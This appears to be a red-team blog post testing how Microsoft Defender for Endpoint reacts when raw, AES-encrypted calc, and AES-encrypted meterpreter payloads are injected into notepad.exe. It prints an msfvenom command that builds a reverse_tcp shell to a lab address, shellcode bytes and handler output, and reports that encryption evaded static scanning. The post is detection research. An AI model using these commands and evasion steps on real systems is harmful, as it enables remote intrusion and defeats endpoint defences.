---
title: "API Series Part 3: Payloads, Memory, and Runtime Reality"
date: 2026-06-25 00:00:00 +0000
categories: [Windows Internals, API Series]
tags: [windows, csharp, mde, edr, behavioural-detection, static-analysis, shellcode, encryption, meterpreter, red-team]
toc: true
---

### A Note on Methodology

The first three parts of this series are not attempts to demonstrate an EDR bypass.

They are attempts to identify detection thresholds.

Each test changes a single variable and observes the outcome, allowing the research to distinguish between telemetry that is merely collected and telemetry that appears to contribute meaningfully to detection.

So far:

- Part 1 tested imports.
- Part 2 tested API execution.
- Part 3 tests payload content.

By progressively isolating variables, we can begin building a picture of where detections are actually originating.

## Overview

Parts 1 and 2 tested two assumptions about where detection fires.

Part 1 found that API imports alone do not trigger Defender's static engine. Part 2 found that on the tested MDE deployment, the injection-related ntdll syscall stubs appeared unmodified and the classic injection APIs executed without generating an alert.

Both results pointed toward the same conclusion:

> Detection was not firing where many practitioners commonly assumed it would.

That raises the next question.

If the imports are not the trigger, and the API calls are not the trigger by themselves, what happens when different payloads are delivered through the same injection workflow?

This post tests that assumption by keeping the injector constant and changing only the payload.

Three scenarios were tested:

1. Raw msfvenom shellcode
2. AES-encrypted calc.exe shellcode
3. AES-encrypted meterpreter reverse_tcp stager

> All testing was performed in an authorised lab environment. Runtime observations were collected from a Windows 11 endpoint with an active Microsoft Defender for Endpoint sensor.

***

## The Question Being Tested

The first two posts established that visibility and detection are not necessarily the same thing.

The imports were visible.

The injection APIs were visible.

Neither observation alone was sufficient to generate an alert.

This leaves several possibilities:

1. The payload content itself is the detection trigger.
2. The payload generates telemetry that later contributes to a detection.
3. Detection occurs only when the payload performs additional malicious behaviour.

The goal of this post is to determine which explanation best matches the observed results.

***

## The Test Setup

The injector remained unchanged throughout all three tests.

It uses the same four-step injection workflow discussed in Parts 1 and 2:

```text
OpenProcess
    ↓
VirtualAllocEx
    ↓
WriteProcessMemory
    ↓
CreateRemoteThread
```

The target process was `notepad.exe`.

The only variable changed between tests was the payload being written into memory.

This allows the results to focus specifically on the impact of payload content rather than differences in tooling or execution flow.

***

## Test 1: Raw Msfvenom Shellcode

The first test establishes what static detection looks like when it fires.

A standard meterpreter reverse_tcp payload was generated using msfvenom and embedded directly within the injector.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f csharp
```

ThreatCheck immediately identified malicious content within the binary:

```text
[+] Target file size: 6656 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x131C
00000034   5D 49 BE 77 73 32 5F 33  32 00 00 41 56 49 89 E6
00000050   49 BC 02 00 11 5C C0 A8  00 0A 41 54 49 89 E4 4C
```

Two obvious indicators appear in the identified byte range:

* `77 73 32 5F 33 32` → `ws2_32`
* `02 00 11 5C C0 A8 00 0A` → embedded network configuration

The payload was identified before execution.

The binary never reached runtime testing because static detection fired first.

![ThreatCheck output showing BasicInjector with raw msfvenom shellcode flagged at offset 0x131C](/assets/img/posts/api-series/threatcheck-basicinjector.png)

### Finding

The classic injection APIs were present in previous tests without producing a detection.

Adding a known meterpreter payload immediately changed the outcome.

The payload content was far more significant to static detection than the injection workflow itself.

***

## Test 2: AES-Encrypted Shellcode - calc.exe

The second test replaces the raw payload with AES-encrypted calc.exe shellcode.

The shellcode was generated, encrypted, and embedded as ciphertext along with the key and IV. The injector decrypted the payload at runtime before injection.

ThreatCheck output:

```text
[+] No threat found!
[*] Run time: 0.08s
```

![ThreatCheck output showing EncryptedInjector with AES-encrypted calc.exe shellcode - no threat found](/assets/img/posts/api-series/threatcheck-encryptedinjector-calc.png)

The binary was transferred to the MDE-protected endpoint.

No detection occurred:

* On disk
* During execution
* During decryption
* During injection
* During payload execution

The injector completed successfully and launched calc.exe.

![Clean execution on the MDE-protected system - EncryptedInjector ran without alert and calc.exe launched](/assets/img/posts/api-series/mde-calc-clean.png)

### Finding

Encrypting the payload removed the identifiable static signature.

More importantly, the resulting runtime behaviour did not generate an alert on the tested system.

The injection workflow was identical to Test 1.

The payload was different.

The outcome was different.

***

## Test 3: AES-Encrypted Meterpreter Stager

The third test reused the same injector and encryption workflow.

The calc payload was replaced with an AES-encrypted meterpreter reverse\_tcp stager.

ThreatCheck again reported a clean result:

```text
[+] No threat found!
[*] Run time: 0.09s
```

![ThreatCheck output showing EncryptedInjector with AES-encrypted meterpreter stager - no threat found](/assets/img/posts/api-series/threatcheck-encryptedinjector-shell.png)

No detection occurred on disk.

A Metasploit handler was started and the injector executed on the MDE-protected endpoint.

Handler output:

```text
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Sending stage (230982 bytes) to 192.168.0.132
[*] Meterpreter session 1 opened
meterpreter >
[*] Meterpreter session 1 closed. Reason: Died
```

The session successfully opened.

Shortly afterward, MDE generated a detection and terminated the process.

Alert:

```text
Behavior:Win32/Meterpreter.C!sms
```

Affected process:

```text
notepad.exe
```

![Windows Defender notification - Threat found popup during active meterpreter session](/assets/img/posts/api-series/mde-alert-notification.png)

![Windows Security Center - full alert detail showing Behavior:Win32/Meterpreter.C!sms detected in Notepad.exe, status Removed](/assets/img/posts/api-series/mde-alert-detail.png)

![msfconsole output - Meterpreter session 1 opened then closed, Reason: Died](/assets/img/posts/api-series/mde-session-died.png)

***

## What Changed?

The injection workflow did not change.

The APIs did not change.

The encryption approach did not change.

The critical difference was what eventually became resident in memory.

The sequence looked like this:

```text
Encrypted Stager
        ↓
Successful Injection
        ↓
Outbound Connection
        ↓
Meterpreter Stage Download
        ↓
Meterpreter Loaded Into Memory
        ↓
Detection
```

The session opened successfully.

The network connection itself was not immediately blocked.

The injection sequence itself was not immediately blocked.

The detection occurred after the meterpreter stage became resident within the target process memory.

***

## What MDE Appears To Have Detected

The detection name:

```text
Behavior:Win32/Meterpreter.C!sms
```

is notable.

The stager was encrypted.

The binary passed static inspection.

The meterpreter stage itself, however, arrived later and existed in memory in a recognisable form.

The observations suggest that overcoming static analysis does not necessarily overcome runtime inspection.

The encrypted stager avoided static detection.

The loaded meterpreter stage did not.

Whether the trigger originated from memory inspection, behavioural analysis, or a combination of telemetry sources, the important point is the same:

> The payload became visible after execution, even though it was invisible before execution.

***

## Summary

| Test                             | ThreatCheck | Disk Detection | Runtime Result                                |
| -------------------------------- | ----------- | -------------- | --------------------------------------------- |
| Raw msfvenom meterpreter         | Flagged     | Yes            | Did not reach execution                       |
| AES-encrypted calc shellcode     | Clean       | No             | Executed successfully                         |
| AES-encrypted meterpreter stager | Clean       | No             | Session opened; later detected and terminated |

The pattern across the tests is clear.

The injection workflow remained largely unchanged.

What changed was the payload.

The results suggest that payload content and runtime presence contributed more directly to detection outcomes than the injection mechanism used to deliver them.

***

## Key Takeaways

Part 1 challenged the assumption that imports were the detection trigger.

Part 2 challenged the assumption that the injection APIs themselves were the detection trigger.

Part 3 challenges a third assumption:

> If static detection is avoided, runtime detection disappears.

The results do not support that conclusion.

The raw meterpreter payload was detected before execution.

The encrypted meterpreter stager avoided static detection but was later detected after additional runtime activity occurred.

Meanwhile, the calc payload completed successfully despite using the same injection workflow.

Taken together, the findings suggest:

```text
Imports
    ≠ Detection

Injection APIs
    ≠ Detection

Encrypted Payload
    ≠ Guaranteed Success
```

The evidence increasingly points toward a layered model in which telemetry is collected continuously and detections emerge from the content, context, and behaviour that follow execution.

The injection mechanism remained largely constant across all three tests.

The payload did not.

That distinction appears to matter.

***

## What Comes Next

The first three posts have progressively challenged common assumptions about where detections originate.

Part 1 found that imports alone were insufficient to trigger a static detection.

Part 2 found that classic process-injection APIs executed successfully despite commonly being described as detection triggers.

Part 3 found that payload content and runtime visibility had a far greater impact on detection outcomes than the injection workflow used to deliver them.

However, further investigation revealed something unexpected.

Although the injection activity completed successfully, Microsoft Defender XDR had recorded detailed telemetry describing the operation, including remote memory manipulation, remote thread creation, executable memory allocation, and process injection activity.

This raises a new question:

> If the injection-related syscall stubs appeared unmodified, where did this telemetry come from?

The next stage of the research is no longer asking whether the activity was visible.

The telemetry shows that it was.

Instead, the question becomes:

> How does MDE observe process injection activity, and which telemetry sources contribute to those observations?

Understanding the answer is important because visibility, alerting, and prevention appear to be distinct stages within the detection pipeline.

The injection activity generated telemetry.

The telemetry generated alerts.

Yet the activity still completed successfully.

Determining how MDE collected that information—and why it sometimes leads to prevention and sometimes does not—is the next logical step in understanding where detection thresholds actually exist.

* **Part 4: If The APIs Weren't Hooked, How Did MDE Know?** *(coming soon)*


***

## References

* [MITRE ATT&CK T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)
* [MITRE ATT&CK T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
* [msfvenom — Metasploit Framework](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
* [ThreatCheck — GitHub](https://github.com/rasta-mouse/ThreatCheck)

**Related posts:**

* API Series Part 1: Do Your API Imports Get You Caught? Testing the Static Assumption
* API Series Part 2: Testing the Runtime Assumption – Are Injection APIs Really the Trigger?

## Acknowledgements

Parts of this article were reviewed with the assistance of Microsoft Copilot. Copilot was used as an editorial and review tool to challenge assumptions, improve clarity, and refine conclusions. All research, tool development, testing, screenshots, and experimental results were performed and validated by the author.
